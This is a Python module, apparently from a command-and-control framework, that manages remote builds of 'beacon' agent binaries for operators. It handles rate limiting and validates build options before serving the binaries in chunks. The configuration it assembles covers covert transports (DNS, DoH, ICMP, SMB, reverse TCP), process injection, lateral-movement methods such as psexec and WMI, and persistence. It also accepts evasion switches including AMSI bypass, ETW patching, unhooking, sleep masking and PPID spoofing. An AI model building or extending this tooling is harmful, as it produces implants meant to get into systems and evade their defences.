"""Remote build manager.

Handles build requests from remote operators. Responsibilities:

  1. Rate-limit per operator and cap concurrent builds.
  2. Run BeaconBuilder against a staged copy of the agent sources.
  3. Serve the resulting binary in chunks.
  4. Garbage-collect stale staged builds.

The operator listener handles authentication. This module assumes
the caller has already passed `_with_cap('beacon.build', ...)`.

Path-whitelist validation of the config's file references is done
upstream by `BeaconHandler._load_build_config(..., remote=True)`,
which runs every path through `_check_build_path` against
`_allowed_build_roots()` before the params reach this module. By
the time `build()` is called, every path in `params` that names a
file resolves under `mtls_certs/`, `tls_certs/`, or
`profiles/c2/` on the server and exists on disk. This module does
not re-validate.

One path escapes the whitelist by design: when the caller does not
supply `agent_keypair_path`, this module substitutes a fixed
default under `.keys/agent/` at the repository root. That path is
server-controlled — no operator input reaches it — so it does not
need the whitelist check. Any other path this module writes to
would be a bug.

Refusal to build without an active handler signer is deliberate
and asymmetric with the local console. The local console warns
and proceeds because the operator is on the server and can see
the state. The remote path refuses because the framework's
task-signing model assumes every task is signed; a remote
operator cannot see the server's stdout and needs the failure to
travel in the response. Do not relax this without a discussion.
"""

from __future__ import annotations

import hashlib
import os
import secrets
import shutil
import threading
import time
from typing import Dict, Optional

from . import constants


class _Build:
    """One staged build."""
    __slots__ = ('id', 'operator', 'path', 'size', 'sha256',
                 'created', 'pivot_key_sha256', 'injector_embedded')

    def __init__(self, build_id, operator, path,
                 pivot_key_sha256='', injector_embedded=False):
        self.id = build_id
        self.operator = operator
        self.path = path
        self.size = os.path.getsize(path)
        self.sha256 = _sha256_of(path)
        self.created = time.time()
        self.pivot_key_sha256 = pivot_key_sha256
        self.injector_embedded = injector_embedded

def _sha256_of(path):
    h = hashlib.sha256()
    with open(path, 'rb') as fh:
        for chunk in iter(lambda: fh.read(1024 * 1024), b''):
            h.update(chunk)
    return h.hexdigest()


class BuildManager:

    def __init__(self, handler, stage_dir: str = None):
        self.handler = handler
        self.stage_dir = stage_dir or constants.BUILD_STAGE_DIR
        os.makedirs(self.stage_dir, exist_ok=True)

        self._lock = threading.Lock()
        self._builds: Dict[str, _Build] = {}
        self._per_op: Dict[str, int] = {}          # operator -> active count
        self._global_active = 0
        self._buckets: Dict[str, dict] = {}        # operator -> rate bucket

        self._sweeper_stop = threading.Event()
        self._sweeper = threading.Thread(
            target=self._sweep_loop, daemon=True)
        self._sweeper.start()

    # ------------------------------------------------------------------
    # Rate limiting

    def _rate_peek(self, operator: str) -> bool:
        """Return True if the bucket for `operator` has at least
        one token, without consuming it. Reads under the lock."""
        now = time.monotonic()
        with self._lock:
            b = self._buckets.get(operator)
            if b is None:
                return True
            elapsed_hours = (now - b['last']) / 3600.0
            refill = elapsed_hours * constants.BUILD_PER_HOUR
            return (min(float(constants.BUILD_PER_HOUR),
                        b['tokens'] + refill) >= 1.0)

    def _try_acquire(self, operator: str) -> bool:
        """Atomically check the slot caps and the rate bucket, and
        acquire both. Returns False if either limit is hit; no
        state changes on failure."""
        now = time.monotonic()
        with self._lock:
            if self._global_active >= \
                    constants.BUILD_CONCURRENT_GLOBAL:
                return False
            if self._per_op.get(operator, 0) >= \
                    constants.BUILD_CONCURRENT_PER_OPERATOR:
                return False

            b = self._buckets.get(operator)
            if b is None:
                b = {'tokens': float(constants.BUILD_PER_HOUR),
                     'last': now}
                self._buckets[operator] = b
            elapsed_hours = (now - b['last']) / 3600.0
            b['last'] = now
            refill = elapsed_hours * constants.BUILD_PER_HOUR
            b['tokens'] = min(
                float(constants.BUILD_PER_HOUR),
                b['tokens'] + refill)
            if b['tokens'] < 1.0:
                return False
            b['tokens'] -= 1.0

            self._global_active += 1
            self._per_op[operator] = \
                self._per_op.get(operator, 0) + 1
            return True

    def _slot_release(self, operator: str) -> None:
        with self._lock:
            self._global_active = max(0, self._global_active - 1)
            n = self._per_op.get(operator, 1) - 1
            if n <= 0:
                self._per_op.pop(operator, None)
            else:
                self._per_op[operator] = n

    def _validate_transport(self, params: dict) -> None:
        """Validate with the shared build_spec rules.

        The builder repeats the same check, but doing it here refuses
        a malformed build before a slot and a rate token are spent.
        Two rules are manager-only because they concern the build
        pipeline rather than the wire config.
        """
        from ..beacon.build_spec import validate
        spec = dict(params)
        for key in ('_evasion_overrides',):
            spec.pop(key, None)
        errors = validate(spec)
        if errors:
            raise RuntimeError('\n'.join(
                f"{e['field']}: {e['message']}" for e in errors))
        fmt = spec.get('output_format')
        if fmt == 'stager':
            if spec.get('wasm_extensions'):
                raise RuntimeError(
                    'stager builds do not support wasm_extensions')
            if spec.get('inject'):
                raise RuntimeError(
                    'stager cannot inject itself (inject must be false)')
            if spec.get('output_format') == 'dll':
                raise RuntimeError(
                    "output_format='dll' cannot be a stager")

    # ------------------------------------------------------------------
    # Build

    def build(self, operator: str, params: dict,
              c2_profile: dict = None) -> dict:
        """Run a build. Returns a dict with `build_id`, `filename`,
        `size`, `sha256`, or raises RuntimeError on failure.

        `params` is the fully-resolved parameter dict that
        BeaconHandler._load_build_config returns. The path whitelist
        has already been applied at that point.
        """

        self._validate_transport(params)

        if not self._try_acquire(operator):
            if not self._rate_peek(operator):
                raise RuntimeError(
                    'build rate limit exceeded '
                    f'({constants.BUILD_PER_HOUR}/hour)')
            raise RuntimeError(
                'too many concurrent builds; try again shortly')

        try:
            return self._run(operator, params, c2_profile)
        finally:
            self._slot_release(operator)

    def _run(self, operator, params, c2_profile) -> dict:
        from ..beacon.builder import (
            BeaconBuilder, BeaconBuildConfig, OPSEC_PROFILES,
        )

        profile_name = params.get('profile_name', 'default')
        if profile_name not in OPSEC_PROFILES:
            raise RuntimeError(
                f'unknown opsec_profile {profile_name!r}')

        build_id = secrets.token_hex(8)
        out_dir = os.path.abspath(
            os.path.join(self.stage_dir, build_id))
        os.makedirs(out_dir, exist_ok=True)
        try:
            os.chmod(out_dir, 0o700)
        except OSError:
            pass

        base = OPSEC_PROFILES[profile_name]
        cfg = BeaconBuildConfig(**dict(base.__dict__))
        cfg.url = params['url']
        cfg.profile_name = profile_name
        cfg.kill_days = params['kill_days']
        cfg.target_os = params['target_os']
        cfg.target_arch = params['target_arch']
        cfg.output_format = params['output_format']
        cfg.tls_profile = params.get('tls_profile') or 'go'
        cfg.work_hours_start = (
            params.get('work_hours_start') or '08:00')
        cfg.work_hours_end = (
            params.get('work_hours_end') or '19:00')
        cfg.verbose = bool(params.get('verbose', False))
        cfg.transport_mode = params.get('transport_mode') or 'http'
        cfg.transport_failover_after = int(
            params.get('transport_failover_after', 3))
        cfg.dns_domain = params.get('dns_domain') or ''
        cfg.dns_resolver = params.get('dns_resolver') or ''
        cfg.doh_resolver = params.get('doh_resolver') or ''
        cfg.doh_host_header = params.get('doh_host_header') or ''
        cfg.doh_user_agent = params.get('doh_user_agent') or ''
        cfg.icmp_host = params.get('icmp_host') or ''
        cfg.smb_pipe = params.get('smb_pipe') or ''
        cfg.smb_relay_pipe = params.get('smb_relay_pipe') or ''
        cfg.tcp_bind_addr = params.get('tcp_bind_addr') or ''
        cfg.tcp_bind_token = params.get('tcp_bind_token') or ''
        cfg.tcp_relay_target = params.get('tcp_relay_target') or ''
        cfg.tcp_relay_token = params.get('tcp_relay_token') or ''
        cfg.tcp_rev_listen = params.get('tcp_rev_listen') or ''
        cfg.tcp_rev_target = params.get('tcp_rev_target') or ''
        cfg.tcp_rev_token = params.get('tcp_rev_token') or ''
        cfg.wireguard_server_pubkey = (
            params.get('wireguard_server_pubkey') or '')
        cfg.wireguard_server_addr = (
            params.get('wireguard_server_addr') or '')
        cfg.wireguard_agent_privkey = (
            params.get('wireguard_agent_privkey') or '')
        cfg.wireguard_tunnel_ip = (
            params.get('wireguard_tunnel_ip') or '')
        cfg.wireguard_inner_port = (
            params.get('wireguard_inner_port') or '')
        cfg.wireguard_server_tunnel_ip = (
            params.get('wireguard_server_tunnel_ip') or '')
        cfg.pivot_key_path = params.get('pivot_key_path') or ''
        cfg.stage_name = params.get('stage_name') or ''
        cfg.stage_key_hex = params.get('stage_key_hex') or ''
        cfg.inject = bool(params.get('inject', False))
        cfg.inject_method = (
            params.get('inject_method') or 'default')
        cfg.identity_role = params.get('identity_role') or ''
        cfg.unhook = bool(params.get('unhook', False))
        cfg.stomp = bool(params.get('stomp', False))
        cfg.stack_spoof = bool(params.get('stack_spoof', True))
        cfg.wasm_extensions = bool(
            params.get('wasm_extensions', False))
        jump = params.get('jump_methods') or ''
        if isinstance(jump, list):
            jump = ','.join(jump)
        valid_jump = {'psexec', 'winrm', 'wmi', 'scshell'}
        for jm in [x.strip() for x in jump.split(',') if x.strip()]:
            if jm not in valid_jump:
                raise RuntimeError(f"unknown jump method {jm!r}")
        cfg.jump_methods = jump
        cfg.persistence = params.get('persistence') or ''
        cfg.tags = params.get('tags') or ''

        ALLOWED_OVERRIDES = frozenset({
            'antisanbox', 'amsi_bypass', 'etw_patch', 'unhook', 'stomp',
            'stack_spoof',
            'sleep_mask', 'syscall_method', 'string_obfuscation',
            'garble', 'upx', 'ppid_spoof', 'antidebug', 'antivm',
            'verbose',
        })
        ev = params.get('_evasion_overrides') or {}
        unknown = set(ev) - ALLOWED_OVERRIDES
        if unknown:
            raise RuntimeError(
                "unknown evasion override(s): "
                + ', '.join(sorted(unknown))
                + ". Allowed keys: "
                + ', '.join(sorted(ALLOWED_OVERRIDES)))
        for key, value in ev.items():
            setattr(cfg, key, value)

        modes = [m.strip().lower()
                 for m in (cfg.transport_mode or 'http').split(',')
                 if m.strip()]
        if ('dns' in modes or 'doh' in modes) \
                and not cfg.dns_domain:
            raise RuntimeError(
                f"transport_mode includes "
                f"{'dns' if 'dns' in modes else 'doh'} but "
                f"dns_domain is empty")
        if 'icmp' in modes:
            if cfg.target_os == 'windows':
                raise RuntimeError(
                    "transport_mode 'icmp' is not supported on "
                    "Windows")
            if not cfg.icmp_host:
                raise RuntimeError(
                    "transport_mode includes 'icmp' but icmp_host "
                    "is empty")

        if params.get('use_mtls'):
            default_cert = params.get('mtls_cert')
            default_key = params.get('mtls_key')
            default_ca = params.get('mtls_ca')
            mtls_dir = params.get('mtls_dir')
            if mtls_dir:
                default_cert = os.path.join(mtls_dir, 'client.pem')
                default_key = os.path.join(mtls_dir, 'client.key')
                default_ca = os.path.join(mtls_dir, 'ca.pem')
            missing = [p for p in
                       (default_cert, default_key, default_ca)
                       if not p or not os.path.isfile(p)]
            if missing:
                raise RuntimeError(
                    'mTLS bundle incomplete on the server; missing '
                    'or unreadable: ' + ', '.join(
                        p or '<unset>' for p in missing))
            cfg.client_cert_path = default_cert
            cfg.client_key_path = default_key
            cfg.root_ca_path = default_ca

        ecdh = getattr(self.handler, 'server_ecdh', None)
        ecdh_pubkey = ecdh.public_b64 if ecdh is not None else ''
        cfg.server_ecdh_pubkey_b64 = ecdh_pubkey

        pivot_digest = ''
        if cfg.pivot_key_path:
            try:
                with open(cfg.pivot_key_path, 'rb') as fh:
                    pivot_digest = hashlib.sha256(
                        fh.read()).hexdigest()
            except OSError as exc:
                raise RuntimeError(
                    f'cannot read pivot key file '
                    f'{cfg.pivot_key_path!r}: {exc}')

        _default_agent_key = os.path.normpath(os.path.join(
            os.path.dirname(os.path.abspath(__file__)),
            '..', '..', '.keys', 'agent', 'agent_signing.key'))
        _configured_key = (params.get('agent_keypair_path')
                           or '').strip()
        if _configured_key:
            cfg.agent_keypair_path = os.path.expanduser(
                _configured_key)
        else:
            cfg.agent_keypair_path = _default_agent_key
        _keydir = os.path.dirname(cfg.agent_keypair_path)
        if _keydir:
            os.makedirs(_keydir, mode=0o700, exist_ok=True)

        pubkey_tmp = None
        if self.handler.signer is not None:
            import tempfile
            tf = tempfile.NamedTemporaryFile(
                mode='w', suffix='.pem', delete=False,
                encoding='utf-8')
            tf.write(self.handler.signer.public_pem)
            tf.close()
            pubkey_tmp = tf.name
            cfg.server_pubkey_path = pubkey_tmp
        else:
            raise RuntimeError(
                'handler signer is not active — refusing to build '
                'an agent that cannot verify task signatures. '
                'Install `cryptography` on the server and restart '
                'the handler.')

        _PROFILE_AWARE = {
            'http', 'quic', 'websocket', 'dns', 'doh',
            'smb', 'tcp', 'tcprev',
        }
        if (c2_profile is not None
                and not any(m in _PROFILE_AWARE for m in modes)):
            raise RuntimeError(
                f"c2_profile is not meaningful on "
                f"transport_mode={cfg.transport_mode!r}. A "
                f"profile is read by http, quic, websocket, dns, "
                f"doh, and the three pivot transports (smb, tcp, "
                f"tcprev). On a pivot build the child shapes its "
                f"own C2 body against the profile it was built "
                f"with, then wraps the shaped body in its own wire "
                f"envelope; the parent's relay forwards both wire "
                f"envelopes verbatim.")

        try:
            source_dir = os.path.join(
                os.path.dirname(os.path.abspath(__file__)),
                '..', 'beacon')
            source_dir = os.path.normpath(source_dir)
            builder = BeaconBuilder(source_dir, out_dir)
            out_path = builder.build(
                cfg, profile=c2_profile or {
                    'user_agent': '', 'linux_user_agent': '',
                    'beacon_path': '/beacon',
                    'tasks_path': '/tasks',
                    'results_path': '/results',
                    'extra_headers': {}, 'request_headers': {},
                })
            injector_embedded = bool(
                getattr(builder, '_last_build_injected', False))
        except Exception:
            shutil.rmtree(out_dir, ignore_errors=True)
            raise
        finally:
            if pubkey_tmp:
                try:
                    os.remove(pubkey_tmp)
                except OSError:
                    pass

        if not out_path or not os.path.exists(out_path):
            shutil.rmtree(out_dir, ignore_errors=True)
            raise RuntimeError(
                'build reported success but produced no binary '
                f'(builder returned {out_path!r}; out_dir={out_dir})')

        build = _Build(
            build_id, operator, out_path,
            pivot_key_sha256=pivot_digest,
            injector_embedded=injector_embedded,
        )
        with self._lock:
            self._builds[build_id] = build

        return {
            'build_id': build_id,
            'filename': os.path.basename(out_path),
            'size':     build.size,
            'sha256':   build.sha256,
            'pivot_key_sha256': pivot_digest,
            'injector_embedded': injector_embedded,
        }

    # ------------------------------------------------------------------
    # Chunked delivery

    def read_chunk(self, build_id: str, operator: str,
                   offset: int, size: int) -> Optional[bytes]:
        """Return the requested slice of a staged build, or None if
        the build is unknown, belongs to another operator, or the
        request is out of range.

        Only the operator who requested the build can download it.
        """
        with self._lock:
            build = self._builds.get(build_id)
        if build is None:
            return None
        if build.operator != operator:
            return None
        if offset < 0 or size <= 0 or offset >= build.size:
            return None
        size = min(size, build.size - offset)
        try:
            with open(build.path, 'rb') as fh:
                fh.seek(offset)
                return fh.read(size)
        except OSError:
            return None

    def finish(self, build_id: str, operator: str) -> bool:
        """Called by the client once it has the whole file. Deletes
        the staged build. Returns True if the caller owned it."""
        with self._lock:
            build = self._builds.get(build_id)
            if build is None or build.operator != operator:
                return False
            self._builds.pop(build_id, None)
        self._delete(build)
        return True

    def info(self, build_id: str, operator: str) -> Optional[dict]:
        with self._lock:
            build = self._builds.get(build_id)
        if build is None or build.operator != operator:
            return None
        return {
            'build_id': build.id,
            'filename': os.path.basename(build.path),
            'size':     build.size,
            'sha256':   build.sha256,
            'age':      int(time.time() - build.created),
            'pivot_key_sha256': build.pivot_key_sha256,
            'injector_embedded': build.injector_embedded,
        }

    # ------------------------------------------------------------------
    # GC

    def _delete(self, build: _Build) -> None:
        parent = os.path.dirname(build.path)
        try:
            shutil.rmtree(parent, ignore_errors=True)
        except Exception:
            pass

    def _sweep_loop(self) -> None:
        while not self._sweeper_stop.wait(120):
            now = time.time()
            stale = []
            with self._lock:
                for bid, build in self._builds.items():
                    if now - build.created > constants.BUILD_STAGE_TTL:
                        stale.append(build)
            for build in stale:
                with self._lock:
                    self._builds.pop(build.id, None)
                self._delete(build)

    def shutdown(self) -> None:
        self._sweeper_stop.set()
        self._sweeper.join(timeout=5.0)
        with self._lock:
            builds = list(self._builds.values())
            self._builds.clear()
        for build in builds:
            self._delete(build)
